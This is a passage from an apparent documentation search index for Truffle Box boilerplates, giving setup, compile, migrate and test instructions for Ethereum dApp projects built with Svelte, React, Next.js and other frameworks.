to Svelte 3. Currently, we load web3 from UNPKG, since it appears to be borderline impossible to bundle successfully. If anybody wants to open a PR to bundle Web3, it would be greatly appreciated.", "title": "Why Rollup?"}, {"location": "boxes/svelte-box/#setting-up", "text": "Install truffle and an ethereum client. For local development, try Ethereum TestRPC. npm install - g truffle // Version 3.0.5+ required. npm install - g ganache - cli // Or the ganache GUI will work too. Download box. truffle unbox antony / svelte - box Run an Ethereum RPC. For simplicity and development we will be using Ethereum TestRPC. ganache - cli Compile and migrate the contracts after authenticating your account on the blockchain (i.e. restoring from seed in MetaMask). truffle compile truffle migrate You're ready to go!", "title": "Setting up"}, {"location": "boxes/svelte-box/#usage", "text": "Components are in src/components/*.html . Everything else is in the usual place according to the docs Run the testrpc so that you have a blockchain to work with, and deploy your contracts: testrpc truffle deploy Log in to metamask by importing the HD Wallet that testrpc gave you, and do the same for one of the accounts by entering its private key. Then, run the dev task to have the code updated in realtime as you develop: truffle compile npm run dev", "title": "Usage"}, {"location": "boxes/svelte-box/#publishing", "text": "To produce your production dApp, run the build task: npm run build This will publish your completed dApp to the folder ./dist", "title": "Publishing"}, {"location": "boxes/svelte-box/#testing", "text": "Testing works much the same way as it does in any web-application, with an additional truffle test command for testing smart contracts. Be sure you've compiled your contracts before running the tests, or you'll get file not found errors. ```javascript npm run test:unit // for dApp tests npm run test:contract // for contract tests ```", "title": "Testing"}, {"location": "boxes/svelte-box/#releasing", "text": "To build the application for production, use the build command. A production build will be in the ./dist folder. ```javascript npm run build ```", "title": "Releasing"}, {"location": "boxes/svelte-box/#faq", "text": "Why is there both a truffle.js file and a truffle-config.js file? Truffle requires the truffle.js file be named truffle-config on Windows machines. Feel free to delete the file that doesn't correspond to your platform.", "title": "FAQ"}, {"location": "boxes/thunder-box/", "text": "ThunderCore Truffle Box \u00b6 The box has all you need to get started with building dapps on ThunderCore . Installation \u00b6 First ensure you are in a new and empty directory. Besides, you have nodejs and yarn (optional) in your environment. Run the unbox command via npx and skip to step 3. npx truffle unbox thundercore/thunder-box Alternatively, you can install Truffle globally and run the unbox command. Make sure you have truffle v 5.0.0 above. npm install -g truffle # (yarn global add truffle) truffle unbox thundercore/thunder-box Run the development console. truffle develop Compile and migrate the smart contracts. Note inside the development console we don't preface commands with truffle . compile migrate Alternatively, you can run the following instructions to compile and migrate the smart contracts. npm run compile # (yarn comile) npm run migrate # (yarn migrate) clean up builded contracts npm clean # (yarn clean) lint your contract. More detail regarding the linter can be found here npm run lint npm run lint:fix Develop on Thunder Testnet and Mainnet \u00b6 Get the thunder tokens You can get Thunder tokens at: https://faucet-testnet.thundercore.com https://faucet.thundercore.com for testnet and mainnet, respectively. Remember to point Metamask's current network to thunder-mainnet (https://mainnet-rpc.thundercore.com) or thunder-testnet (https://testnet-rpc.thundercore.com/) after creating those two networks via Avatar -> Settings -> Networks . Setup the control of accounts for deployment Either: Write your 12-word mnemonic (seed phrase) to a file named .mnemonic Export your account private keys, one per line, to a file named .private-keys # If you use private keys mv .private-keys.template .private-keys # in .private-keys file, put your private keys e59cb5e369b65eee650f90f3280cbe8039db81335943ac7a88df5f4df... d92a96fa691a7c31b2e2891de05cacc85d562b128afa6bb8f7108aac7... # If you prefer mnemonic mv .mnemonic.template .mnemonic # In .mnemonic file, put your mnemonic dog cat apple bird ... Compile and migrate your contract for testnet and mainnet # Compile to testnet npm run compile:testnet # is equal to truffle compile --network thunder-testnet # --- # Compile to mainnet npm run compile:mainnet # is equal to truffle compile --network thunder-mainnet # --- # Migrate to testnet npm run migrate:testnet # is equal to truffle migrate --network thunder-testnet # --- # Migrate to mainnet npm run migrate:mainnet # is equal to truffle migrate --network thunder-mainnet", "title": "ThunderCore Truffle Box"}, {"location": "boxes/thunder-box/#thundercore-truffle-box", "text": "The box has all you need to get started with building dapps on ThunderCore .", "title": "ThunderCore Truffle Box"}, {"location": "boxes/thunder-box/#installation", "text": "First ensure you are in a new and empty directory. Besides, you have nodejs and yarn (optional) in your environment. Run the unbox command via npx and skip to step 3. npx truffle unbox thundercore/thunder-box Alternatively, you can install Truffle globally and run the unbox command. Make sure you have truffle v 5.0.0 above. npm install -g truffle # (yarn global add truffle) truffle unbox thundercore/thunder-box Run the development console. truffle develop Compile and migrate the smart contracts. Note inside the development console we don't preface commands with truffle . compile migrate Alternatively, you can run the following instructions to compile and migrate the smart contracts. npm run compile # (yarn comile) npm run migrate # (yarn migrate) clean up builded contracts npm clean # (yarn clean) lint your contract. More detail regarding the linter can be found here npm run lint npm run lint:fix", "title": "Installation"}, {"location": "boxes/thunder-box/#develop-on-thunder-testnet-and-mainnet", "text": "Get the thunder tokens You can get Thunder tokens at: https://faucet-testnet.thundercore.com https://faucet.thundercore.com for testnet and mainnet, respectively. Remember to point Metamask's current network to thunder-mainnet (https://mainnet-rpc.thundercore.com) or thunder-testnet (https://testnet-rpc.thundercore.com/) after creating those two networks via Avatar -> Settings -> Networks . Setup the control of accounts for deployment Either: Write your 12-word mnemonic (seed phrase) to a file named .mnemonic Export your account private keys, one per line, to a file named .private-keys # If you use private keys mv .private-keys.template .private-keys # in .private-keys file, put your private keys e59cb5e369b65eee650f90f3280cbe8039db81335943ac7a88df5f4df... d92a96fa691a7c31b2e2891de05cacc85d562b128afa6bb8f7108aac7... # If you prefer mnemonic mv .mnemonic.template .mnemonic # In .mnemonic file, put your mnemonic dog cat apple bird ... Compile and migrate your contract for testnet and mainnet # Compile to testnet npm run compile:testnet # is equal to truffle compile --network thunder-testnet # --- # Compile to mainnet npm run compile:mainnet # is equal to truffle compile --network thunder-mainnet # --- # Migrate to testnet npm run migrate:testnet # is equal to truffle migrate --network thunder-testnet # --- # Migrate to mainnet npm run migrate:mainnet # is equal to truffle migrate --network thunder-mainnet", "title": "Develop on Thunder Testnet and Mainnet"}, {"location": "boxes/tomochain-box/", "text": "tomochain-box \u00b6 A truffle box to easily start with smart contract deployment on TomoChain. Testnet and Mainnet networks as well as the 10 TOMO deployment fee are already configured. Installation \u00b6 Install truffle and truffle HDWalletPriovider. npm install -g truffle truffle-hdwallet-provider Open that truffle box. truffle unbox etienne-napoleone/tomochain-box Configuration \u00b6 Add the mnemonic of your founded account (more than 10 TOMO) to the .mnemonic file. Attention: A gitignore was automatically created to ignore the .mnemonic file. Please be careful to never version it! Usage \u00b6 Develop your smart contracts, migrations and tests as usual. You can then deploy directly on the TomoChain network of your choice. truffle test truffle compile truffle deploy --network testnet # or mainnet", "title": "tomochain-box"}, {"location": "boxes/tomochain-box/#tomochain-box", "text": "A truffle box to easily start with smart contract deployment on TomoChain. Testnet and Mainnet networks as well as the 10 TOMO deployment fee are already configured.", "title": "tomochain-box"}, {"location": "boxes/tomochain-box/#installation", "text": "Install truffle and truffle HDWalletPriovider. npm install -g truffle truffle-hdwallet-provider Open that truffle box. truffle unbox etienne-napoleone/tomochain-box", "title": "Installation"}, {"location": "boxes/tomochain-box/#configuration", "text": "Add the mnemonic of your founded account (more than 10 TOMO) to the .mnemonic file. Attention: A gitignore was automatically created to ignore the .mnemonic file. Please be careful to never version it!", "title": "Configuration"}, {"location": "boxes/tomochain-box/#usage", "text": "Develop your smart contracts, migrations and tests as usual. You can then deploy directly on the TomoChain network of your choice. truffle test truffle compile truffle deploy --network testnet # or mainnet", "title": "Usage"}, {"location": "boxes/truffle-ci-box/", "text": "Truffle CI Box \u00b6 [![Build Status](https://travis-ci.org/NFhbar/truffle-ci-box.svg?branch=master)](https://travis-ci.org/NFhbar/truffle-ci-box) [![Coverage Status](https://coveralls.io/repos/github/NFhbar/truffle-ci-box/badge.svg?branch=master)](https://coveralls.io/github/NFhbar/truffle-ci-box?branch=master) [![contributions welcome](https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat)](https://github.com/NFhbar/truffle-ci-box/pulls) This box comes with everything you need to start a truffle project with Travis-ci and Coveralls integration. It also includes solium, eslint, and several common testing helpers. Installation \u00b6 Install Truffle and Ganache CLI globally. npm install - g truffle npm install - g ganache - cli Download the box. truffle unbox NFhbar / truffle - ci - box Create a .env file in the root directory and add your private key. RINKEBY_PRIVATE_KEY=\"MyPrivateKeyHere...\" ROPSTEN_PRIVATE_KEY=\"MyPrivateKeyHere...\" Update the Travis and Coveralls badges in the README file to point to your own repository. Change any lint or solium rules that you like, and feel free to modify the scripts or anything else you want!", "title": "Truffle CI Box"}, {"location": "boxes/truffle-ci-box/#truffle-ci-box", "text": "[![Build Status](https://travis-ci.org/NFhbar/truffle-ci-box.svg?branch=master)](https://travis-ci.org/NFhbar/truffle-ci-box) [![Coverage Status](https://coveralls.io/repos/github/NFhbar/truffle-ci-box/badge.svg?branch=master)](https://coveralls.io/github/NFhbar/truffle-ci-box?branch=master) [![contributions welcome](https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat)](https://github.com/NFhbar/truffle-ci-box/pulls) This box comes with everything you need to start a truffle project with Travis-ci and Coveralls integration. It also includes solium, eslint, and several common testing helpers.", "title": "Truffle CI Box"}, {"location": "boxes/truffle-ci-box/#installation", "text": "Install Truffle and Ganache CLI globally. npm install - g truffle npm install - g ganache - cli Download the box. truffle unbox NFhbar / truffle - ci - box Create a .env file in the root directory and add your private key. RINKEBY_PRIVATE_KEY=\"MyPrivateKeyHere...\" ROPSTEN_PRIVATE_KEY=\"MyPrivateKeyHere...\" Update the Travis and Coveralls badges in the README file to point to your own repository. Change any lint or solium rules that you like, and feel free to modify the scripts or anything else you want!", "title": "Installation"}, {"location": "boxes/truffle-create-react-app/", "text": "Truffle and React (create-react-app) Rapid Ethereum Dapp Development A Minimal Smart Contract Development Boilerplate with create-react-app -based frontend. \u00b6 Truffle is great for developing Solidity smart contracts, and create-react-app is a great way to bootstrap a React project. Unfortunately, the official truffle box for React uses the eject mode of the create-react-app, which may be a disadvantage to many React developers. This box provides a basic integration between truffle and React app without using the eject mode of create-react-app. There are two major features: A plain truffle init project is used as the base (along with a SimpleStorage example contract). A create-react-app based React project resides in the web-app directory with a symlink to the build/contracts folder containing ABI definitions (created after running truffle compile ). The provided React app is intentionally minimalistic to avoid imposing any specific requirements on the developer. For more information on how the frontend works, go read the README.md located in the web-app directory. Installation \u00b6 Install Truffle globally. yarn global add truffle Download the box. This also takes care of installing the necessary dependencies. truffle unbox Charterhouse/truffle-create-react-app Run the development console. truffle develop Compile and migrate the smart contracts. Note that inside the development console we don't preface commands with truffle . compile migrate Truffle can run tests written in Solidity or JavaScript against your smart contracts. Note the command varies slightly if you're in or outside of the development console. # If inside the development console. test # If outside the development console.. truffle test Run the create-react-app server for the front-end. Smart contract changes must be manually recompiled and migrated. # Change directory to the front-end folder cd web-app # Serves the front-end on http://localhost:3000 yarn start We included some basic tests for our react components. You can run them from the web-app folder: # Change directory to the front-end folder cd web-app yarn test # for watch mode CI = TRUE yarn test # for non-watch mode Visual Studio Code integration \u00b6 The project is ready for Visual Studio Code. Out of the box it supports integration with standardJS and vscode-jest . standardJS \u00b6 The integration with standardJS is done on two levels: settings.json for the VSCode Workspace and the top-level package.json . The workspace level options in settings.json are the following: \"javascript.validate.enable\" : false , \"standard.usePackageJson\" : true , \"standard.autoFixOnSave\" : true The top-level package.json includes the following standardJS configuration: \"standard\" : { \"parser\" : \"babel-eslint\" , \"ignore\" : [ \"build/**\" , \"node_modules/**\" , \"web-app/node_modules/**\" , \"web-app/src/contracts\" ], \"envs\" : [ \"es6\" , \"browser\" , \"jest\" ], \"globals\" : [ \"artifacts\" , \"contract\" , \"assert\" ] } The only thing that still remains to be performed by the user is to install the JavaScriopt Standard Style extension (authored by Sam Chen). vscode-jest \u00b6 The vscode-jest extension (authored by orta and jest community) provides integration with jest test runner. Because the react project is in a subfolder, additional configuration has been added to the workspace settings.json file: \"jest.pathToJest\" : \"npm test --\" , \"jest.rootPath\" : \"web-app\" , \"jest.restartJestOnSnapshotUpdate\" : true Note, that for the very same reason, Jest extension needs to be started manually via command palette ( CMD+SHIFT+P and then Jest: Start Runner ). jest extension for VSCode only runs the tests for the web-app. You still need to run solidity tests using the truffle development console.", "title": "Index"}, {"location": "boxes/truffle-create-react-app/#a-minimal-smart-contract-development-boilerplate-with-create-react-app-based-frontend", "text": "Truffle is great for developing Solidity smart contracts, and create-react-app is a great way to bootstrap a React project. Unfortunately, the official truffle box for React uses the eject mode of the create-react-app, which may be a disadvantage to many React developers. This box provides a basic integration between truffle and React app without using the eject mode of create-react-app. There are two major features: A plain truffle init project is used as the base (along with a SimpleStorage example contract). A create-react-app based React project resides in the web-app directory with a symlink to the build/contracts folder containing ABI definitions (created after running truffle compile ). The provided React app is intentionally minimalistic to avoid imposing any specific requirements on the developer. For more information on how the frontend works, go read the README.md located in the web-app directory.", "title": "A Minimal Smart Contract Development Boilerplate with create-react-app-based frontend."}, {"location": "boxes/truffle-create-react-app/#installation", "text": "Install Truffle globally. yarn global add truffle Download the box. This also takes care of installing the necessary dependencies. truffle unbox Charterhouse/truffle-create-react-app Run the development console. truffle develop Compile and migrate the smart contracts. Note that inside the development console we don't preface commands with truffle . compile migrate Truffle can run tests written in Solidity or JavaScript against your smart contracts. Note the command varies slightly if you're in or outside of the development console. # If inside the development console. test # If outside the development console.. truffle test Run the create-react-app server for the front-end. Smart contract changes must be manually recompiled and migrated. # Change directory to the front-end folder cd web-app # Serves the front-end on http://localhost:3000 yarn start We included some basic tests for our react components. You can run them from the web-app folder: # Change directory to the front-end folder cd web-app yarn test # for watch mode CI = TRUE yarn test # for non-watch mode", "title": "Installation"}, {"location": "boxes/truffle-create-react-app/#visual-studio-code-integration", "text": "The project is ready for Visual Studio Code. Out of the box it supports integration with standardJS and vscode-jest .", "title": "Visual Studio Code integration"}, {"location": "boxes/truffle-create-react-app/#standardjs", "text": "The integration with standardJS is done on two levels: settings.json for the VSCode Workspace and the top-level package.json . The workspace level options in settings.json are the following: \"javascript.validate.enable\" : false , \"standard.usePackageJson\" : true , \"standard.autoFixOnSave\" : true The top-level package.json includes the following standardJS configuration: \"standard\" : { \"parser\" : \"babel-eslint\" , \"ignore\" : [ \"build/**\" , \"node_modules/**\" , \"web-app/node_modules/**\" , \"web-app/src/contracts\" ], \"envs\" : [ \"es6\" , \"browser\" , \"jest\" ], \"globals\" : [ \"artifacts\" , \"contract\" , \"assert\" ] } The only thing that still remains to be performed by the user is to install the JavaScriopt Standard Style extension (authored by Sam Chen).", "title": "standardJS"}, {"location": "boxes/truffle-create-react-app/#vscode-jest", "text": "The vscode-jest extension (authored by orta and jest community) provides integration with jest test runner. Because the react project is in a subfolder, additional configuration has been added to the workspace settings.json file: \"jest.pathToJest\" : \"npm test --\" , \"jest.rootPath\" : \"web-app\" , \"jest.restartJestOnSnapshotUpdate\" : true Note, that for the very same reason, Jest extension needs to be started manually via command palette ( CMD+SHIFT+P and then Jest: Start Runner ). jest extension for VSCode only runs the tests for the web-app. You still need to run solidity tests using the truffle development console.", "title": "vscode-jest"}, {"location": "boxes/truffle-kaleido-box/", "text": "Truffle & Kaleido Truffle Box \u00b6 This box gives you a boilerplate to get up and running quickly with Truffle on a Kaleido chain. Installation \u00b6 First ensure you are in a new and empty directory. Choose one of the following options to download and install the Kaleido Truffle box In your preferred directory run the unbox command with npx . This will install all necessary dependencies. npx truffle unbox kaleido-io/truffle-kaleido-box Alternatively, install Truffle globally and then run the unbox command in your preferred directory. npm install -g truffle truffle unbox kaleido-io/truffle-kaleido-box Connect to Kaleido \u00b6 In the Kaleido console, navigate to your environment, click on Security in the left hand navigation menu, then click on App Creds Click New App Cred and give it a name and click Create . Do not close this window until we have completed the steps below Navigate to where you downloaded the Kaleido Truffle Box in the section above. Open up the truffle-config.js file in your preferred IDE Back in the Kaleido console, copy the JSON/RPC HTTP endpoint with valid App Creds that's generated in the right hand menu. Paste this full URL into Line 9 where you see 'nodeConnectionURL'. Make sure to keep the URL that you insert inside quotation marks If you are using Quorum in this environment, ensure to uncomment the type: \"quorum\" property on your network object. Running Truffle \u00b6 Run the development console. This will instantiate a local chain for you to test that Truffle is working properly. truffle develop Ensure that you're able to both compile, test, and finally migrate your contracts to your local chain. compile test migrate If everything looks good, you can exit the Truffle console with .exit .", "title": "Index"}, {"location": "boxes/truffle-kaleido-box/#truffle-kaleido-truffle-box", "text": "This box gives you a boilerplate to get up and running quickly with Truffle on a Kaleido chain.", "title": "Truffle &amp; Kaleido Truffle Box"}, {"location": "boxes/truffle-kaleido-box/#installation", "text": "First ensure you are in a new and empty directory. Choose one of the following options to download and install the Kaleido Truffle box In your preferred directory run the unbox command with npx . This will install all necessary dependencies. npx truffle unbox kaleido-io/truffle-kaleido-box Alternatively, install Truffle globally and then run the unbox command in your preferred directory. npm install -g truffle truffle unbox kaleido-io/truffle-kaleido-box", "title": "Installation"}, {"location": "boxes/truffle-kaleido-box/#connect-to-kaleido", "text": "In the Kaleido console, navigate to your environment, click on Security in the left hand navigation menu, then click on App Creds Click New App Cred and give it a name and click Create . Do not close this window until we have completed the steps below Navigate to where you downloaded the Kaleido Truffle Box in the section above. Open up the truffle-config.js file in your preferred IDE Back in the Kaleido console, copy the JSON/RPC HTTP endpoint with valid App Creds that's generated in the right hand menu. Paste this full URL into Line 9 where you see 'nodeConnectionURL'. Make sure to keep the URL that you insert inside quotation marks If you are using Quorum in this environment, ensure to uncomment the type: \"quorum\" property on your network object.", "title": "Connect to Kaleido"}, {"location": "boxes/truffle-kaleido-box/#running-truffle", "text": "Run the development console. This will instantiate a local chain for you to test that Truffle is working properly. truffle develop Ensure that you're able to both compile, test, and finally migrate your contracts to your local chain. compile test migrate If everything looks good, you can exit the Truffle console with .exit .", "title": "Running Truffle"}, {"location": "boxes/truffle-next/", "text": "Truffle and Next.js Rapid Ethereum Dapp Development A Minimal Smart Contract Development Boilerplate \u00b6 Truffle is great for developing Solidity smart contracts, but building a React frontend for a smart contract is often a chore. Next.js is one of the easiest ways to build such a frontend and the integration between Truffle and Next.js is what this boilerplate is trying to demonstrate. There are two major features: A plain truffle init project is used as the base (along with a SimpleStorage example contract). A Next.js project resides in the client directory with a symlink to the output folder of the contract ABI definitions. The Next.js app also provides a simple skeleton for connecting to and interacting with the smart contract on a network. For more information on how the frontend works, go read the README.md located in the client directory. Installation \u00b6 Install Truffle globally. npm install -g truffle Download the box. This also takes care of installing the necessary dependencies. truffle unbox adrianmcli/truffle-next Run the development console. truffle develop Compile and migrate the smart contracts. Note inside the development console we don't preface commands with truffle . compile migrate Run the next.js server for the front-end. Smart contract changes must be manually recompiled and migrated. // Change directory to the front-end folder cd client // Serves the front-end on http://localhost:3000 npm run dev Truffle can run tests written in Solidity or JavaScript against your smart contracts. Note the command varies slightly if you're in or outside of the development console. // If inside the development console. test // If outside the development console.. truffle test Running with MetaMask \u00b6 Since truffle develop exposes the blockchain onto port 9545 , you'll need to add a Custom RPC network of http://localhost:9545 in your MetaMask to make it work. Running with TestRPC \u00b6 We highly recommend using truffle develop over testrpc , but if you want to use testrpc , there are a couple things you need to do: Change Line 6 of client/lib/getWeb3.js to use localhost:8545 instead of localhost:9545 so we refer to testrpc instead of truffle develop . Run your testrpc with the following command (because reasons ): testrpc --gasLimit 6721975 --gasPrice 100000000000", "title": "Index"}, {"location": "boxes/truffle-next/#a-minimal-smart-contract-development-boilerplate", "text": "Truffle is great for developing Solidity smart contracts, but building a React frontend for a smart contract is often a chore. Next.js is one of the easiest ways to build such a frontend and the integration between Truffle and Next.js is what this boilerplate is trying to demonstrate. There are two major features: A plain truffle init project is used as the base (along with a SimpleStorage example contract). A Next.js project resides in the client directory with a symlink to the output folder of the contract ABI definitions. The Next.js app also provides a simple skeleton for connecting to and interacting with the smart contract on a network. For more information on how the frontend works, go read the README.md located in the client directory.", "title": "A Minimal Smart Contract Development Boilerplate"}, {"location": "boxes/truffle-next/#installation", "text": "Install Truffle globally. npm install -g truffle Download the box. This also takes care of installing the necessary dependencies. truffle unbox adrianmcli/truffle-next Run the development console. truffle develop Compile and migrate the smart contracts. Note inside the development console we don't preface commands with truffle . compile migrate Run the next.js server for the front-end. Smart contract changes must be manually recompiled and migrated. // Change directory to the front-end folder cd client // Serves the front-end on http://localhost:3000 npm run dev Truffle can run tests written in Solidity or JavaScript against your smart contracts. Note the command varies slightly if you're in or outside of the development console. // If inside the development console. test // If outside the development console.. truffle test", "title": "Installation"}, {"location": "boxes/truffle-next/#running-with-metamask", "text": "Since truffle develop exposes the blockchain onto port 9545 , you'll need to add a Custom RPC network of http://localhost:9545 in your MetaMask to make it work.", "title": "Running with MetaMask"}, {"location": "boxes/truffle-next/#running-with-testrpc", "text": "We highly recommend using truffle develop over testrpc , but if you want to use testrpc , there are a couple things you need to do: Change Line 6 of client/lib/getWeb3.js to use localhost:8545 instead of localhost:9545 so we refer to testrpc instead of truffle develop . Run your testrpc with the following command (because reasons ): testrpc --gasLimit 6721975 --gasPrice 100000000000", "title": "Running with TestRPC"}, {"location": "boxes/truffle-react-dapp/", "text": "Truffle React DApp \u00b6 This project is build for react dapp developing, include solidity contract writing and web3.js API using demo. Installtation \u00b6 Install Truffle yarn global add truffle Download the box with the truffle unbox command. truffle unbox tpai/truffle-react-dapp Lauch local blockchain server, you could use truffle develop console, or UI interface Ganache . truffle develop Compile and deploy contracts truffle compile truffle migrate Install metamask extension , switch to private network first, and configure custom RPC URL http://127.0.0.1:7545 , then use seed phrase to login, you will have first account logged in. Start web server, visit http://localhost:3000 , try to send some ETH and Token from current account to another account and see what happens. // If this is your first time running the start command, you'll also need to run `yarn` to install the necessary dependencies. cd client && yarn start", "title": "Truffle React DApp"}, {"location": "boxes/truffle-react-dapp/#truffle-react-dapp", "text": "This project is build for react dapp developing, include solidity contract writing and web3.js API using demo.", "title": "Truffle React DApp"}, {"location": "boxes/truffle-react-dapp/#installtation", "text": "Install Truffle yarn global add truffle Download the box with the truffle unbox command. truffle unbox tpai/truffle-react-dapp Lauch local blockchain server, you could use truffle develop console, or UI interface Ganache . truffle develop Compile and deploy contracts truffle compile truffle migrate Install metamask extension , switch to private network first, and configure custom RPC URL http://127.0.0.1:7545 , then use seed phrase to login, you will have first account logged in. Start web server, visit http://localhost:3000 , try to send some ETH and Token from current account to another account and see what happens. // If this is your first time running the start command, you'll also need to run `yarn` to install the necessary dependencies. cd client && yarn start", "title": "Installtation"}, {"location": "boxes/truffle-react-redux/", "text": "Truffle-React-Redux \u00b6 The truffle-react-redux provide the template(box) for your next dapp with React (and Redux, Route, Internationalization). The template separate the concern of contracts and web frontend as sub projects and include glue scripts to bridge the both sides. Installation \u00b6 Install Truffle , Lerna , ganachi-cli globally. npm install -g truffle lerna ganachi-cli Download the box. This also takes care of installing the necessary dependencies. truffle unbox gasolin/truffle-react-redux (This step will be done automatically after unbox.) Glue script can help you to install contracts/ and web/ project dependencies at once via lerna bootstrap npm run bootstrap # or you can install dependency modules in sub projects via separate commands cd contracts && npm install cd ../web && npm install Run the test chain \u00b6 Run the test chain via npm run chain The test chain will always start with the same addeess/accounts. Check Test chain detail section for more detail. Contracts development \u00b6 Enter contracts/ folder Run the development console. truffle develop Compile and migrate the smart contracts. Note inside the development console we don't preface commands with truffle . Smart contract changes must be manually recompiled and migrated. compile migrate # If outside the development console.. npm run build Glue scripts can copy compiled JSON files into web/src/lib to access contract. npm run deploy Truffle can run tests written in Solidity or JavaScript against your smart contracts. Note the command varies slightly if you're in or outside of the development console. # If inside the development console. test # If outside the development console.. truffle test # glue script npm run test Web development \u00b6 Enter web/ folder Run the front-end hot reloading in web/ (outside the truffle development console). // Serves the front-end on http://localhost:8080 npm run start Build the web project for production. npm run build Create-react-app can run tests within src/ folder. npm run test What Does Truffle-React-Redux offer? \u00b6 The contracts/ sub project contain normal contracts and was bootstrapped with truffle init command. The web/ sub project was bootstrapped with Create React App and have pre-configured React and Redux basic settings with react-router and react-intl . You can access the blockchain via pre-configured redux state.web3 , state.accounts , state.contracts , state.transactions (via drizzle ), or use lib/web3utils directly without redux state. The template provide top level scripts so you can compile and deploy contracts via npm run compile , npm run migrate commands, or run the app in the development mode via npm start command without enter the sub project folders. The glue scripts also help manage contracts and web sub projects by install dependency modules and copy compiled JSON into web/src/lib for accessing contracts. Dependencies \u00b6 Whole project \u00b6 lerna Manage contracts/ and web/ project. command description bootstrap install sub project dependencies chain run a test chain compile compile contracts migrate migrate contracts start Runs the web dapp in the development mode publish pump sub project packages version Contracts sub project \u00b6 truffle : Build, debug, deploy the smart contracts. command description truffle compile compile contracts truffle migrate migrate contracts Read more in http://truffleframework.com/docs/ Web sub project \u00b6 Create React App : Create React apps with no build configuration. Redux : State management. redux-devtools-extension drizzle : Redux store for web3 and smart contracts. Maintains access to underlying functionality ex: Web3 and your contract's methods. react-router : Declarative routing for React react-intl : Internationalize React apps redux-logger Logger (middleware) for Redux in development command description npm start Runs the app in the development mode npm test Launches the test runner in the interactive watch mode npm test -- --coverage Run test once and show the test coverage Read more in https://github.com/facebook/create-react-app/blob/master/packages/react-scripts/template/README.md Test chain detail \u00b6 Available Accounts ================== (0) 0x1d489c3f8ed5ee71325a847888b2157c9ac29c05 (~100 ETH) (1) 0x1ce421937a6f59bf58faafe316d23aaed690da18 (~100 ETH) (2) 0x6dbc30ff01a1066ba5af9dfa7b838f4932995b4b (~100 ETH) (3) 0x4a6bfc37b3f0f511310e6d0e4dcbdac99f5899c5 (~100 ETH) (4) 0xfd1f713d6e8101aab1aeaaec4aad7380442d6042 (~100 ETH) (5) 0x4db199fefe8b4a1cd8027c546519498b75e77292 (~100 ETH) (6) 0xba27d6c39dfa9d2a42f91aa5043817c325ec7b43 (~100 ETH) (7) 0x35ace72f822f3adbd4cfa633358d5ed7161fa76e (~100 ETH) (8) 0x68ad18971b17c434aa39f022451c29bdb99e19bf (~100 ETH) (9) 0xc6b346f43e3a1a60ef3d378d07486fb518f5eb2b (~100 ETH) Private Keys ================== (0) 0xbea70301d065cf7946f25251c73dbfff93d4320715e43bdc0d5087553074cb64 (1) 0x8c90c6365f62ff46b3a04edc5dbae3f401f36a50ce5f6da03ba12c08d8a72478 (2) 0xfa2fe8493616350833f4e8979276e0297dab4db889e18a8a33a49c024d3888f0 (3) 0x52f3756c688192c59d372825a2a581ed685a6efe032a343116cf5ed084f7d713 (4) 0xe7ea2af66e409f10ad4e3a06496b59c230363988879a1609d8fa5414c25feb2a (5) 0xaab4090f43e729d2d04f34c93ed441c9903be85c0a227922cb66aac705a6a0da (6) 0x5bbd4586b26aa73bbc162e8ab9e3c13b44fd204434f5fac7d57b256bdae09ef4 (7) 0xf63ca261915e41c1f2dcb8535ce14c5b1e675f3ff01515de820819477d37812c (8) 0xf15be1c6e435585c3b8e568167dd7067c0fc732422421e1f9f3e437ae65a6ce8 (9) 0x55b842b841e2e082d178d7a63c95288f90bb69354064e75c2e6cb7d94f7ecada HD Wallet ================== Mnemonic: mandate wagon sample embrace law ghost join friend tray onion dose dynamic Base HD Path: m/44'/60'/0'/0/{account_index} Gas Price ================== 20000000000 Gas Limit ================== 6721975 Listening on 127.0.0.1:8545 Support Developer Team \u00b6 If truffle-react-redux made your life easier and you like it and want to help us improve it further or if you want to speed up new features, please, support us with a tip. We appreciate all contributions!", "title": "Truffle-React-Redux"}, {"location": "boxes/truffle-react-redux/#truffle-react-redux", "text": "The truffle-react-redux provide the template(box) for your next dapp with React (and Redux, Route, Internationalization). The template separate the concern of contracts and web frontend as sub projects and include glue scripts to bridge the both sides.", "title": "Truffle-React-Redux"}, {"location": "boxes/truffle-react-redux/#installation", "text": "Install Truffle , Lerna , ganachi-cli globally. npm install -g truffle lerna ganachi-cli Download the box. This also takes care of installing the necessary dependencies. truffle unbox gasolin/truffle-react-redux (This step will be done automatically after unbox.) Glue script can help you to install contracts/ and web/ project dependencies at once via lerna bootstrap npm run bootstrap # or you can install dependency modules in sub projects via separate commands cd contracts && npm install cd ../web && npm install", "title": "Installation"}, {"location": "boxes/truffle-react-redux/#run-the-test-chain", "text": "Run the test chain via npm run chain The test chain will always start with the same addeess/accounts. Check Test chain detail section for more detail.", "title": "Run the test chain"}, {"location": "boxes/truffle-react-redux/#contracts-development", "text": "Enter contracts/ folder Run the development console. truffle develop Compile and migrate the smart contracts. Note inside the development console we don't preface commands with truffle . Smart contract changes must be manually recompiled and migrated. compile migrate # If outside the development console.. npm run build Glue scripts can copy compiled JSON files into web/src/lib to access contract. npm run deploy Truffle can run tests written in Solidity or JavaScript against your smart contracts. Note the command varies slightly if you're in or outside of the development console. # If inside the development console. test # If outside the development console.. truffle test # glue script npm run test", "title": "Contracts development"}, {"location": "boxes/truffle-react-redux/#web-development", "text": "Enter web/ folder Run the front-end hot reloading in web/ (outside the truffle development console). // Serves the front-end on http://localhost:8080 npm run start Build the web project for production. npm run build Create-react-app can run tests within src/ folder. npm run test", "title": "Web development"}, {"location": "boxes/truffle-react-redux/#what-does-truffle-react-redux-offer", "text": "The contracts/ sub project contain normal contracts and was bootstrapped with truffle init command. The web/ sub project was bootstrapped with Create React App and have pre-configured React and Redux basic settings with react-router and react-intl . You can access the blockchain via pre-configured redux state.web3 , state.accounts , state.contracts , state.transactions (via drizzle ), or use lib/web3utils directly without redux state. The template provide top level scripts so you can compile and deploy contracts via npm run compile , npm run migrate commands, or run the app in the development mode via npm start command without enter the sub project folders. The glue scripts also help manage contracts and web sub projects by install dependency modules and copy compiled JSON into web/src/lib for accessing contracts.", "title": "What Does Truffle-React-Redux offer?"}, {"location": "boxes/truffle-react-redux/#dependencies", "text": "", "title": "Dependencies"}, {"location": "boxes/truffle-react-redux/#whole-project", "text": "lerna Manage contracts/ and web/ project. command description bootstrap install sub project dependencies chain run a test chain compile compile contracts migrate migrate contracts start Runs the web dapp in the development mode publish pump sub project packages version", "title": "Whole project"}, {"location": "boxes/truffle-react-redux/#contracts-sub-project", "text": "truffle : Build, debug, deploy the smart contracts. command description truffle 